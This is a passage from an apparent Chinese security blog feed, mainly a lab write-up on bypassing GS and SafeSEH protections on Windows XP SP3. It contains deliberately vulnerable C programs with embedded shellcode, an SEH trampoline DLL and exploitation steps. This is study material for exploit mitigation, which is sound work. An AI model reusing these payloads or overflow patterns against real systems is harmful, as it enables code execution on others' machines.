d[i] + a[<span class="number">5</span> + j], d[i] ^ a[<span class="number">5</span> + j])</span><br><span class="line">    solver.add(d[i] == check[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    flag = <span class="string">""</span>.join([chr(m[each].as_long()) <span class="keyword">for</span> each <span class="keyword">in</span> a])</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line"></span><br><span class="line">t2 = time.time()</span><br><span class="line">print(t2 - t1)</span><br></pre></td></tr></table></figure><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm" target="_blank" rel="noopener">z3库教程</a><br><a href="https://pan.baidu.com/s/1iGcBxku2NtjMggzTxF2_VA" target="_blank" rel="noopener">本文的样例和代码百度云链接</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;在两次遇到需要用z3来线性求解的题目，而且两个题目当时都没做出来，第一道是TokyoWesterns CTF easy_crack_me，第
      
    
    </summary>
    
    
      <category term="z3" scheme="https://bigkan.github.io/tags/z3/"/>
    
      <category term="ctf" scheme="https://bigkan.github.io/tags/ctf/"/>
    
      <category term="逆向" scheme="https://bigkan.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>绕过GS和SafeSEH保护</title>
    <link href="https://bigkan.github.io/2019/05/15/%E7%BB%95%E8%BF%87GS%E5%92%8CSafeSEH%E4%BF%9D%E6%8A%A4/"/>
    <id>https://bigkan.github.io/2019/05/15/绕过GS和SafeSEH保护/</id>
    <published>2019-05-15T11:48:45.000Z</published>
    <updated>2020-07-02T15:07:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>在看了《0day安全》的<strong>栈中的守护天使：GS</strong>和<strong>亡羊补牢：SafeSEH</strong>，并将里面的实验做了一遍之后，总结一下遇到的坑和一些失败的经验。文章将从下面几点进行讲述：</p></blockquote><ul><li><ol><li>如何使用VS2019编译能在windows XP SP3上运行的程序。如何对程序和电脑进行GS，SafeSEH，DEP进行设置</li></ol></li><li><ol start="2"><li>GS的原理和绕过方法（实验失败）</li></ol></li><li><ol start="3"><li>SafeSEH的原理和绕过方法<a id="more"></a></li></ol></li></ul><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>虚拟机：VMware 15 Pro</li><li>运行环境：Windows XP SP3</li><li>编译软件：vs2019和vc6.0</li><li>调试软件：ollydbg</li><li>IDA pro 7.0</li><li>所有代码，软件都在的<a href="https://pan.baidu.com/s/1ZxsGvBK_2HaA8MNYFANVzA" target="_blank" rel="noopener">百度云链接中</a> 提取码：f91a</li></ul><h1 id="VS2019和windows系统的一些设置"><a href="#VS2019和windows系统的一些设置" class="headerlink" title="VS2019和windows系统的一些设置"></a>VS2019和windows系统的一些设置</h1><h2 id="编译能在XP上运行的程序"><a href="#编译能在XP上运行的程序" class="headerlink" title="编译能在XP上运行的程序"></a>编译能在XP上运行的程序</h2><p>VS忽略4996警告（使用strcpy会产生4996警告）： 程序开头添加#pragma warning(disable : 4996)</p><p>当直接使用VS2019编译最简单的HelloWorld之后，在xp中运行会报下面的错误不是有效的Win32应用程序。我从网上找到了一个老哥写的配置属性。只需要在VS2019中按下面步骤进行操作就可以了。视图-》其他窗口-》属性管理器-》添加现有属性 把支持xp的属性表WinXP.props（这个属性表在百度云盘中）添加进去。</p><p><img src="/2019/05/15/绕过GS和SafeSEH保护/不是有效的Win32应用程序.png" alt="不是有效Win32应用程序"></p><h2 id="对应安全设置的关闭"><a href="#对应安全设置的关闭" class="headerlink" title="对应安全设置的关闭"></a>对应安全设置的关闭</h2><ul><li>禁用优化：项目–》属性–》c/c++–》优化–》优化设置为/Od</li><li>GS设置（默认开启）： 项目–》属性–》c/c++–》代码生成–》安全检查</li><li>SafeSEH关闭（默认开启）：项目–》属性–》链接器–》命令行–》将 /SAFESEH:NO 复制到“其它选项（D)”框中，然后点击应用</li><li>VS2019编译DEP关闭（默认开启）：项目–》属性–》链接器–》高级–》数据执行保护(DEP)  设置为 否 (/NXCOMPAT:NO)</li><li>XP DEP关闭（默认对核心模块开启）：在Windows系统中 我的电脑右键属性-》高级-》启动和故障恢复设置-》系统启动，编辑-》添加/noexecute=Alwayoff。如下图所示。</li></ul><p><img src="/2019/05/15/绕过GS和SafeSEH保护/Win关闭DEP.png" alt="Win关闭DEP"></p><hr><h1 id="GS保护原理"><a href="#GS保护原理" class="headerlink" title="GS保护原理"></a>GS保护原理</h1><h2 id="Security-cookie"><a href="#Security-cookie" class="headerlink" title="Security cookie"></a>Security cookie</h2><p>GS编译选项为每个函数调用增加了一些额外操作，用以检测栈中的溢出。</p><ul><li>在所有函数调用前，在EBP之前向栈中压入一个额外的随机DWORD，这个随机数就是Security cookie（也叫canary）</li><li>在.data中也存了一个Security cookie副本。当存在溢出时，溢出数据会先覆盖cookie，之后才会覆盖EBP和EIP（返回地址）。</li><li>在函数返回前会对cookie进行校验。如果栈中的cookie和.data中存的cookie不相同，将会进入异常处理流程。</li></ul><h2 id="Security-Cookie产生细节"><a href="#Security-Cookie产生细节" class="headerlink" title="Security Cookie产生细节"></a>Security Cookie产生细节</h2><ul><li>系统以.data节的第一个双字做为Cookie的种子，或称原始Cookie</li><li>在程序每次运行时Cookie的种子都不同</li><li>在栈帧初始化以后系统用ESP异或种子，做为当前函数的Cookie，以此来作为不同函数的区别，并增加随机性</li><li>在函数返回前，用ESP还原出Cookie的种子</li></ul><h2 id="不会使用GS的情况"><a href="#不会使用GS的情况" class="headerlink" title="不会使用GS的情况"></a>不会使用GS的情况</h2><p>使用GS必定会对程序性能产生影响，所以编译器并不会对所有函数都使用GS进行保护，当然可以用#paragma struct_gs_check(on)会对任意类型函数添加security Cookie进行保护。下面是不会应用GS的情况</p><ul><li>函数不包括缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是8字节类型且大小不大于4字节</li></ul><h2 id="变量重新排序"><a href="#变量重新排序" class="headerlink" title="变量重新排序"></a>变量重新排序</h2><p>在编译的时根据局部变量的类型对变量在栈帧中的位置进行位置调整，将字符串变量移动到栈帧的高地址，可以防止字符串溢出时破坏其他变量。同时将指针参数和字符串参数复制到内存中的低地址，防止参数被破坏。如下图未使用GS保护的栈和使用GS保护的栈的对比</p><p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS栈对比.png" alt="GS栈对比"></p><h1 id="绕过GS保护（失败）"><a href="#绕过GS保护（失败）" class="headerlink" title="绕过GS保护（失败）"></a>绕过GS保护（失败）</h1><h2 id="利用未保护的内存突破GS"><a href="#利用未保护的内存突破GS" class="headerlink" title="利用未保护的内存突破GS"></a>利用未保护的内存突破GS</h2><p>类似前几篇的溢出直接覆盖到EIP就能成功</p><h2 id="覆盖虚函数突破GS"><a href="#覆盖虚函数突破GS" class="headerlink" title="覆盖虚函数突破GS"></a>覆盖虚函数突破GS</h2><p>没有实验过</p><h2 id="同时替换栈中和-data中的cookie突破GS"><a href="#同时替换栈中和-data中的cookie突破GS" class="headerlink" title="同时替换栈中和.data中的cookie突破GS"></a>同时替换栈中和.data中的cookie突破GS</h2><p>没实验过</p><h2 id="利用异常处理器绕过GS"><a href="#利用异常处理器绕过GS" class="headerlink" title="利用异常处理器绕过GS"></a>利用异常处理器绕过GS</h2><p>如果只是将SEH_handler覆盖为shellcode地址在win xp sp3上并不能成功，因为在sp3上负责异常分发的（不知道这样说对不对）ntdll.dll启用了SafeSEH，会对SEH_handler指向的异常处理函数的地址进行校验，如果是在栈的地址范围内将不会得到执行。所以我只能从侧面验证利用异常处理器绕过GS是否可行。我将用一个栈外的地址来覆盖SEH_handler，如果程序能运行到这个地址，则认为在没有SafeSEH保护的情况下可以利用异常处理器来绕过GS。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名GS_SEH.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xCC\xCC\xCC\xCC"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xA0\xFE\x12\x00"</span><span class="comment">//address of shellcode</span></span><br><span class="line"><span class="comment">//"\x13\x13\x13\x00"//栈外的地址</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf, input);</span><br><span class="line"><span class="built_in">strcat</span>(buf, input);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译代码选项</p><ul><li>1.启用GS</li><li>2.关闭SafeSEH</li><li>3.关闭DEP<br>上面代码在test函数中存在典型的栈溢出漏洞，strcpy操作后buf变量会被溢出，当字符串足够长时将覆盖SEH异常处理函数。同时也会覆盖input地址，造成strcat从一个非法地址读取数据，触发异常。用OD加载程序之后，按F9运行程序。如下图会产生访问异常并且确实已经将SEH成功覆盖为0x0012FEA0。按照提示<strong>shift+F9</strong>让异常处理来接管程序，OD提示<strong>Debugged program was unable process exection</strong>，并不能成功让异常处理程序执行。</li></ul><p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS_SEH覆盖.png" alt="GS_SEH覆盖" title="GS_SEH覆盖"></p><p>为了验证之前的猜想，将原本指向shellcode的地址修改为”\x13\x13\x13\x00”,并在这个地址添加硬件中断，方便验证是否能通过SEH来控制程序。如下图，在触发异常后，程序果然运行到了我们设置的0x00131313地址。暂时我们可能还没办法利用SEH绕过GS，因为实际上我们是需要绕过SafeSEH。总体来说我们还是验证了GS的功能和单纯GS绕过的办法。</p><p><img src="/2019/05/15/绕过GS和SafeSEH保护/GS_SEH验证.png" alt="GS_SEH验证" title="GS_SEH验证"></p><h1 id="SafeSEH保护原理"><a href="#SafeSEH保护原理" class="headerlink" title="SafeSEH保护原理"></a>SafeSEH保护原理</h1><p>编译器在编译程序的时候将所有的异常处理函数地址提取出来，编入一张安全SEH表，并将这张表放到程序的映像里面。当程序调用异常处理函数的时候会将函数地址与安全SEH表进行匹配。异常处理函数的调用是通过RtlDispatchException()函数处理实现的。RtlDispatchException()函数保护的流程</p><ul><li><ol><li>检查异常处理链是否位于当前栈中。如果不在当前栈中，程序将终止异常处理函数的调用</li></ol></li><li><ol start="2"><li>通过查询线程信息块（ TEB）中的FS:[4]和FS:[8]可以获得当前程序栈的高地址和低地址。检查异常处理函数指针是否指向当前程序的栈中。如果指向当前程序的栈中将终止异常处理函数的调用（这就是前面利用SEH绕过GS无法成功的原因）。</li></ol></li><li><ol start="3"><li>前两个检查通过后会调用RtlIsValidHandler()来对异常处理函数(SEH_handler)的有效性进行验证。</li></ol></li></ul><p>RtlIsValidHandler首先判断处理函数地址是否在加载模块的内存空间，如果属于加载模块的内存空间，将进行下面的校验</p><ul><li><ol><li>判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识。如果设置了，这个程序内的异常会被忽略。函数直接返回失败</li></ol></li><li><ol start="2"><li>检查程序是否包含安全SEH表。如果包含SEH表，这将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</li></ol></li><li><ol start="3"><li>判断是否设置了ILonly表示。如果设置了，表明只包含.NET编译的中间语言，直接返回失败。</li></ol></li><li><ol start="4"><li>判断异常处理函数是否位于不可执行页上。当异常处理函数地址位于不可执行页上时，检验函数检查DEP是否开启，如果系统未开启DEP则返回成功，否则程序抛出访问违例。</li></ol></li></ul><p>当异常处理函数的地址不在加载模块的内存空间中时，检验函数直接进行DEP检查</p><ul><li><ol><li>判断异常处理函数是否位于不可执行页上。当异常处理函数地址位于不可执行页上时，检验函数检查DEP是否开启，如果系统未开启DEP则返回成功，否则程序抛出访问违例。</li></ol></li><li><ol start="2"><li>判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则校验失败。</li></ol></li></ul><p>综上所述：总共有3种情况会允许异常处理函数的运行以及利用的可行性</p><ul><li><ol><li>异常处理函数位于加载模块内存范围之外，DEP关闭。这种情况只需要在加载模块范围外找到一个跳板指令就可以转到shellcode执行。</li></ol></li><li><ol start="2"><li>异常处理函数位于加载模块之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL。这种情况可以利用未启用SafeSEH的模块做为跳板转入到shellcode执行</li></ol></li><li><ol start="3"><li>异常处理函数位于加载模块内存范围内，相应模块启用SafeSEH，异常处理函数地址包含在安全SEH表中。这种情况不是很好利用（我暂时不会）</li></ol></li><li><ol start="4"><li>还有一种情况是，SEH中的异常函数指针指向堆区，异常处理会直接跳转过去执行。</li></ol></li></ul><h1 id="绕过SafeSEH"><a href="#绕过SafeSEH" class="headerlink" title="绕过SafeSEH"></a>绕过SafeSEH</h1><h2 id="攻击返回地址绕过SafeSEH"><a href="#攻击返回地址绕过SafeSEH" class="headerlink" title="攻击返回地址绕过SafeSEH"></a>攻击返回地址绕过SafeSEH</h2><p>没有开启GS的时候，可以直接覆盖返回地址</p><h2 id="利用虚函数绕过SafeSEH"><a href="#利用虚函数绕过SafeSEH" class="headerlink" title="利用虚函数绕过SafeSEH"></a>利用虚函数绕过SafeSEH</h2><p>没有触发异常，实验也没做过</p><h2 id="从堆中绕过SafeSEH"><a href="#从堆中绕过SafeSEH" class="headerlink" title="从堆中绕过SafeSEH"></a>从堆中绕过SafeSEH</h2><p>就像前面第4点说的，将shellcode放在堆区，如果覆盖SEH_handler指向堆区就能直接执行。这里有个小坑的地方就是，调试状态下的堆区和正常执行的堆区地址是不一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_heap.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\xba\xcb\xd0\xfc\x46\xd9\xca\xd9\x74\x24\xf4\x5b\x29"</span></span><br><span class="line"><span class="string">"\xc9\xb1\x31\x31\x53\x13\x03\x53\x13\x83\xeb\x37\x32"</span></span><br><span class="line"><span class="string">"\x09\xba\x2f\x31\xf2\x43\xaf\x56\x7a\xa6\x9e\x56\x18"</span></span><br><span class="line"><span class="string">"\xa2\xb0\x66\x6a\xe6\x3c\x0c\x3e\x13\xb7\x60\x97\x14"</span></span><br><span class="line"><span class="string">"\x70\xce\xc1\x1b\x81\x63\x31\x3d\x01\x7e\x66\x9d\x38"</span></span><br><span class="line"><span class="string">"\xb1\x7b\xdc\x7d\xac\x76\x8c\xd6\xba\x25\x21\x53\xf6"</span></span><br><span class="line"><span class="string">"\xf5\xca\x2f\x16\x7e\x2e\xe7\x19\xaf\xe1\x7c\x40\x6f"</span></span><br><span class="line"><span class="string">"\x03\x51\xf8\x26\x1b\xb6\xc5\xf1\x90\x0c\xb1\x03\x71"</span></span><br><span class="line"><span class="string">"\x5d\x3a\xaf\xbc\x52\xc9\xb1\xf9\x54\x32\xc4\xf3\xa7"</span></span><br><span class="line"><span class="string">"\xcf\xdf\xc7\xda\x0b\x55\xdc\x7c\xdf\xcd\x38\x7d\x0c"</span></span><br><span class="line"><span class="string">"\x8b\xcb\x71\xf9\xdf\x94\x95\xfc\x0c\xaf\xa1\x75\xb3"</span></span><br><span class="line"><span class="string">"\x60\x20\xcd\x90\xa4\x69\x95\xb9\xfd\xd7\x78\xc5\x1e"</span></span><br><span class="line"><span class="string">"\xb8\x25\x63\x54\x54\x31\x1e\x37\x32\xc4\xac\x4d\x70"</span></span><br><span class="line"><span class="string">"\xc6\xae\x4d\x24\xaf\x9f\xc6\xab\xa8\x1f\x0d\x88\x47"</span></span><br><span class="line"><span class="string">"\x6a\x0c\xb8\xcf\x33\xc4\xf9\x8d\xc3\x32\x3d\xa8\x47"</span></span><br><span class="line"><span class="string">"\xb7\xbd\x4f\x57\xb2\xb8\x14\xdf\x2e\xb0\x05\x8a\x50"</span></span><br><span class="line"><span class="string">"\x67\x25\x9f\x32\xe6\xb5\x43\x9b\x8d\x3d\xe1\xe3"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB8\x63\x15\x00"</span><span class="comment">//正常堆地址</span></span><br><span class="line"><span class="comment">//"\xb8\x59\x15\x00"//调试状态堆地址</span></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(str, input);</span><br><span class="line"><span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line">zero++;</span><br><span class="line">zero = zero / (zero - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buf address:0x%x\n"</span>, buf);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, shellcode);</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验代码解释</p><ul><li><ol><li>申请500字节存放shellcode</li></ol></li><li><ol start="2"><li>test函数中的strcpy存在溢出漏洞，用超长的字符串造成溢出覆盖SEH</li></ol></li><li><ol start="3"><li>触发除零溢出（编译时要禁用优化）,使异常处理函数得以执行，成功执行shellcode</li></ol></li></ul><p>实验环境</p><ul><li>系统：windows xp sp3</li><li>编译器：VS2019</li><li>编译选项：启用GS,启用SafeSEH，禁用优化，禁用DEP</li><li>build版本：release版本。</li></ul><p>实验过程</p><ul><li><ol><li>找到堆分配的首地址。使用OD不知道函数的入口地址的时候可以配合IDA找到地址，然后在堆分配函数之后下断点，执行之后EAX就保存着堆的首地址。因为调试状态和正常运行时堆的分配是不同的，所以为了实验更简单，直接输出了堆的首地址。在我的虚拟机上调试状态堆地址是0x001559B8，正常执行时堆地址是0x001563B8</li></ol></li><li><ol start="2"><li>确定需要多长的字符串才能覆盖到SEH_Handler。可以用前几篇文章的方法先生成字符串确定需要的字符串长度。</li></ol></li></ul><p>如下图为执行到堆栈时的图。按F9就能顺利弹出计算器。当直接执行SafeSEH_heap.exe时需要用cmd来运行，否则只会一闪而过。</p><p><img src="/2019/05/15/绕过GS和SafeSEH保护/SafeSEH_heap.png" alt="SafeSEH_heap"></p><h2 id="利用未启用SafeSEH模块绕过SafeSEH"><a href="#利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="利用未启用SafeSEH模块绕过SafeSEH"></a>利用未启用SafeSEH模块绕过SafeSEH</h2><p>如果能够找到一个未启用SafeSEH的模块，可以利用未启用的模块跳转到Shellcode。这次实验要编译一个未启用SafeSEH的dll和一个调用这个dll存在漏洞的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HANDLE hModule,DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jump</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">pop eax</span><br><span class="line">pop eax</span><br><span class="line">retn</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NoSafeSEH.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span 